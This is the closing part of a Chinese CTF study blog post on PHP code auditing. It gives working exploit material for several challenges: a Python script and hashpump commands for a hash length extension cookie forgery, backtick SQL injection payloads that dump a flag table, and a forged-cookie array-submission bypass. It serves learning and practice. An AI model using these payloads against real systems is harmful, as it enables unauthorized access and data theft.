url&#x3D;&#39;http:&#x2F;&#x2F;120.26.131.152:32778&#x2F;&#39;</span><br><span class="line">	digest&#x3D;m[0]</span><br><span class="line">	</span><br><span class="line">	message&#x3D;urllib.quote(urllib.unquote(m[1])[::-1]) #quote将\x00 变为%00</span><br><span class="line">	cookie&#x3D;&#39;role&#x3D;&#39;+message+&#39;; hsh&#x3D;&#39;+digest #设置新cookie</span><br><span class="line">	#print cookie</span><br><span class="line">	headers&#x3D;&#123;</span><br><span class="line">	&#39;cookie&#39;: cookie,</span><br><span class="line">	&#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0&#39;,</span><br><span class="line">	&#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">	&#39;Accept-Language&#39;: &#39;:zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3&#39;,</span><br><span class="line">	&#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;</span><br><span class="line">&#125;</span><br><span class="line">	print headers</span><br><span class="line">	re&#x3D;requests.get(url&#x3D;url,headers&#x3D;headers)</span><br><span class="line">	print re.text</span><br><span class="line">	if &quot;Welcome&quot; in re.text:</span><br><span class="line">		print re;</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>
+
+<p>上面是直接运行代码即可获取flag</p>
+<p>下面是利用hashpump手工构造payload 然后拿去burpsuite爆破</p>
+<p>这里使用hashpump进行填充的时候会得到一个填充后的hash值 填充时的长度就是我们需要进行爆破的</p>
+<p>从4到18 然后最后拿去burpsuite爆破 查看返回包 就会得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 4 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 5 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 6 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 7 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 8 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 9 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 10 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 11 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 12 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 13 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 14 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 15 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 16 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 17 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d &#39;;&quot;tseug&quot;:5:s&#39; -k 18 -a &#39;;&quot;nimda&quot;:5:s&#39;|tee -a hashpump.txt</span><br><span class="line"></span><br><span class="line"># %80%00%00%00%00%00%00%00%00%00%00%00%00%00%00</span><br><span class="line"># %88%00%00%00%00%00%00%00%00%00%00%00%00%00</span><br><span class="line"># %90%00%00%00%00%00%00%00%00%00%00%00%00</span><br><span class="line"># %98%00%00%00%00%00%00%00%00%00%00%00</span><br><span class="line"># %a0%00%00%00%00%00%00%00%00%00%00</span><br><span class="line"># %a8%00%00%00%00%00%00%00%00%00</span><br><span class="line"># %b0%00%00%00%00%00%00%00%00</span><br><span class="line"># %b8%00%00%00%00%00%00%00</span><br><span class="line"># %c0%00%00%00%00%00%00</span><br><span class="line"># %c8%00%00%00%00%00</span><br><span class="line"># %d0%00%00%00%00</span><br><span class="line"># %d8%00%00%00</span><br><span class="line"># %e0%00%00</span><br><span class="line"># %e8%00</span><br><span class="line"># %f0</span><br></pre></td></tr></table></figure>
+
+<p>最后可以获取flag的cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;role&quot;: &quot;s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3B&quot;, &quot;hsh&quot;: &quot;fcdc3840332555511c4e4323f6decb07&quot;</span><br></pre></td></tr></table></figure>
+
+<p>PS:只有salt在前，value在后，才能进行哈希长度扩展攻击</p>
+<h2 id="0x19-反单引号注入"><a href="#0x19-反单引号注入" class="headerlink" title="0x19 反单引号注入"></a>0x19 反单引号注入</h2><p><span class="exturl" data-url="aHR0cDovL3dlYi5qYXJ2aXNvai5jb206MzI3OTQv" title="http://web.jarvisoj.com:32794/">原题链接<i class="fa fa-external-link"></i></span></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&quot;config.php&quot;);</span><br><span class="line">$table &#x3D; $_GET[&#39;table&#39;]?$_GET[&#39;table&#39;]:&quot;test&quot;;</span><br><span class="line">$table &#x3D; Filter($table);</span><br><span class="line">mysqli_query($mysqli,&quot;desc &#96;secret_&#123;$table&#125;&#96;&quot;) or Hacker();</span><br><span class="line">$sql &#x3D; &quot;select &#39;flag&#123;xxx&#125;&#39; from secret_&#123;$table&#125;&quot;;</span><br><span class="line">$ret &#x3D; sql_query($sql);</span><br><span class="line">echo $ret[0];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>源码里面可能有两处存在sql注入的地方 </p>
+<p>(1)mysqli_query($mysqli,”desc <code>secret_{$table}</code>“)</p>
+<p>(2)$sql = “select ‘flag{xxx}’ from secret_{$table}”;</p>
+<p>这两处地方第一句用来反引号，百度一下反引号和单引号的区别</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desc users xxx; &#x2F;&#x2F; 返回空</span><br><span class="line">desc &#96;users&#96; &#96;xxx&#96;； &#x2F;&#x2F;返回空</span><br><span class="line">desc &#39;users&#39; &#39;xxx&#39;; &#x2F;&#x2F;报错</span><br></pre></td></tr></table></figure>
+
+<p>举个例子：SELECT <code>select</code> FROM <code>test</code> WHERE select=’字段值’<br>在test表中，有个select字段，如果不用反引号，MYSQL将把select视为保留字而导致出错，所以，有MYSQL保留字作为字段的，必须加上反引号来区分。为了区分MYSQL的保留字与普通字符而引入的符号</p>
+<p>建表的时候一般都会将表名，库名都加上反引号来保证语句的执行度</p>
+<p>所以按照第一条语句构造注入时要使语句变成desc <code>test</code> <code>union select database()limit1,1</code></p>
+<p>要闭合反引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?table&#x3D;test&#96;&#96;union select database() limit 1,1</span><br><span class="line">?table&#x3D;test&#96;&#96;union select group_concat(distinct table_name) from information_schema.tables where table_schema&#x3D;database()limit 1,1 &#x2F;&#x2F;这里会有两个表 secret_flag secret_test</span><br><span class="line">?table&#x3D;test&#96;&#96;union select group_concat(distinct column_name) from information_schema.columns where table_name&#x3D;0x7365637265745f666c6167 limit 1,1 #有一个字段flagUwillNeverKnow</span><br><span class="line">?table&#x3D;test&#96;&#96;union select group_concat(flagUwillNeverKnow) from secret_flag limit 1,1</span><br><span class="line">最后得到flag：flag&#123;luckyGame~&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x1a-利用数组提交绕过逻辑"><a href="#0x1a-利用数组提交绕过逻辑" class="headerlink" title="0x1a 利用数组提交绕过逻辑"></a>0x1a 利用数组提交绕过逻辑</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$role &#x3D; &quot;guest&quot;;</span><br><span class="line">$flag &#x3D; &quot;flag&#123;test_flag&#125;&quot;;</span><br><span class="line">$auth &#x3D; false;</span><br><span class="line">if(isset($_COOKIE[&quot;role&quot;]))&#123;</span><br><span class="line">    $role &#x3D; unserialize(base64_decode($_COOKIE[&quot;role&quot;]));</span><br><span class="line">    if($role &#x3D;&#x3D;&#x3D; &quot;admin&quot;)&#123;</span><br><span class="line">        $auth &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $auth &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $role &#x3D; base64_encode(serialize($role));</span><br><span class="line">    setcookie(&#39;role&#39;,$role);</span><br><span class="line">&#125;</span><br><span class="line">if($auth)&#123;</span><br><span class="line">    if(isset($_POST[&#39;filename&#39;]))&#123;</span><br><span class="line">        $filename &#x3D; $_POST[&#39;filename&#39;];</span><br><span class="line">        $data &#x3D; $_POST[&#39;data&#39;];</span><br><span class="line">        if(preg_match(&#39;[&lt;&gt;?]&#39;, $data)) &#123;</span><br><span class="line">            die(&#39;No No No!&#39;.$data);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            $s &#x3D; implode($data);</span><br><span class="line">            if(!preg_match(&#39;[&lt;&gt;?]&#39;, $s))&#123;</span><br><span class="line">                $flag&#x3D;&#39;None.&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">            $rand &#x3D; rand(1,10000000);</span><br><span class="line">            $tmp&#x3D;&quot;.&#x2F;uploads&#x2F;&quot;.md5(time() + $rand).$filename;</span><br><span class="line">            file_put_contents($tmp, $flag);</span><br><span class="line">            echo &quot;your file is in &quot; . $tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;Hello admin, now you can upload something you are easy to forget.&quot;;</span><br><span class="line">        echo &quot;&lt;br &#x2F;&gt;there are the source.&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        echo &#39;&lt;textarea rows&#x3D;&quot;10&quot; cols&#x3D;&quot;100&quot;&gt;&#39;;</span><br><span class="line">        echo htmlspecialchars(str_replace($flag,&#39;flag&#123;???&#125;&#39;,file_get_contents(__FILE__)));</span><br><span class="line">        echo &#39;&lt;&#x2F;textarea&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;Sorry. You have no permissions.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先看源码 设置了cookie 不过没有取hash 所以只需要将cookie先反序列化 再base64解码 然后将guest改成admin</p>
+<p>然后先base64再序列化，当成新的cookie使用就行</p>
+<p>下面代码看出需要POST两个参数 一个filename一个data</p>
+<p>filename没有做要求 但是对data做了要求 第一次检查&lt;&gt;是否在里面 在的话直接退出 但是下面又要检查&lt;&gt;在data里面 不在的话$s为空值 flag将会被替换</p>
+<p>但是注意到$s是由implode函数转换来的 而implode接受的参数类型是数组 </p>
+<p>所以data我们就需要传入一个数组</p>
+<p>类似这种:data[0]=999&amp;data[1]=&lt;&gt;</p>
+<p>所以思路就出来了 首先将cookie里面的guest改为admin</p>
+<p>然后post的两个参数如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;oslo.php&amp;data[0]&#x3D;999&amp;data[1]&#x3D;&lt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>重放这个包 回显会有提示文件路径 直接访问即可获取flag</p>
+<h2 id="Above"><a href="#Above" class="headerlink" title="Above"></a>Above</h2><p>以上都是我这两天学习的一些简单的PHP代码审计 后面应该会进行更高一层次的PHP代码审计学习</p>
+<p>这些都是PHP代码里面的一些小特性和一些逻辑绕过，点很小，也不是很综合，都是分开来一个点一个点来学习理解</p>
+<p>往后更加努力 能够离大佬的距离越来越近 :D</p>
+<p>By oslo</p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Code/" rel="tag"><i class="fa fa-tag"></i> Code</a>
+              <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/22/SQL%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0%E5%BD%95/" rel="prev" title="SQL注入小记录">
+      <i class="fa fa-chevron-left"></i> SQL注入小记录
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP代码审计学习记录"><span class="nav-number">1.</span> <span class="nav-text">PHP代码审计学习记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-PHP的extract变量覆盖"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 PHP的extract变量覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-绕过过滤空白字符"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 绕过过滤空白字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-多重加密"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 多重加密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-SQL注入之WITH-ROLLUP绕过"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 SQL注入之WITH ROLLUP绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-ereg正则-00截断"><span class="nav-number">1.5.</span> <span class="nav-text">0x04 ereg正则%00截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05strcmp比较字符串绕过"><span class="nav-number">1.6.</span> <span class="nav-text">0x05strcmp比较字符串绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-sha1-函数比较绕过"><span class="nav-number">1.7.</span> <span class="nav-text">0x06 sha1()函数比较绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-SESSION-验证绕过"><span class="nav-number">1.8.</span> <span class="nav-text">0x07 SESSION 验证绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-MD5密码比较绕过"><span class="nav-number">1.9.</span> <span class="nav-text">0x08 MD5密码比较绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-URLdecode二次编码绕过"><span class="nav-number">1.10.</span> <span class="nav-text">0x09 URLdecode二次编码绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xa-sql注入闭合绕过"><span class="nav-number">1.11.</span> <span class="nav-text">0xa sql注入闭合绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xb-X-Forwarded-For绕过指定IP地址"><span class="nav-number">1.12.</span> <span class="nav-text">0xb X-Forwarded-For绕过指定IP地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xc-MD5加密相等绕过"><span class="nav-number">1.13.</span> <span class="nav-text">0xc MD5加密相等绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xd-intval函数四舍五入绕过"><span class="nav-number">1.14.</span> <span class="nav-text">0xd intval函数四舍五入绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xe-strpos数组绕过NULL与ereg正则-00截断"><span class="nav-number">1.15.</span> <span class="nav-text">0xe strpos数组绕过NULL与ereg正则%00截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xf-SQL注入or绕过"><span class="nav-number">1.16.</span> <span class="nav-text">0xf SQL注入or绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-MD5函数绕过"><span class="nav-number">1.17.</span> <span class="nav-text">0x10 MD5函数绕过&#x3D;&#x3D;&#x3D;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-十六进制与数字比较"><span class="nav-number">1.18.</span> <span class="nav-text">0x11 十六进制与数字比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x12-数字验证正则绕过"><span class="nav-number">1.19.</span> <span class="nav-text">0x12 数字验证正则绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x13-弱类型整数大小比较绕过"><span class="nav-number">1.20.</span> <span class="nav-text">0x13 弱类型整数大小比较绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x14-md5函数true注入绕过"><span class="nav-number">1.21.</span> <span class="nav-text">0x14 md5函数true注入绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x15-switch无break-字符与0比较绕过"><span class="nav-number">1.22.</span> <span class="nav-text">0x15 switch无break 字符与0比较绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x16-unserialize-序列化"><span class="nav-number">1.23.</span> <span class="nav-text">0x16 unserialize()序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x17"><span class="nav-number">1.24.</span> <span class="nav-text">0x17</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x18"><span class="nav-number">1.25.</span> <span class="nav-text">0x18</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x19-反单引号注入"><span class="nav-number">1.26.</span> <span class="nav-text">0x19 反单引号注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1a-利用数组提交绕过逻辑"><span class="nav-number">1.27.</span> <span class="nav-text">0x1a 利用数组提交绕过逻辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Above"><span class="nav-number">1.28.</span> <span class="nav-text">Above</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Oslo"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Oslo</p>
+  <div class="site-description" itemprop="description">You guilty , You died</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+      <a href="/">
+         <img class="site-author-image" itemprop="image"
+       	src="/images/avatar.jpg"
+       	alt="Oslo" />
+      </a>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Oslo</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">72k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:05</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.getAttribute('pjax') !== null) {
+      script.setAttribute('pjax', '');
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+  
+
+    </div>
+</body>
+</html>
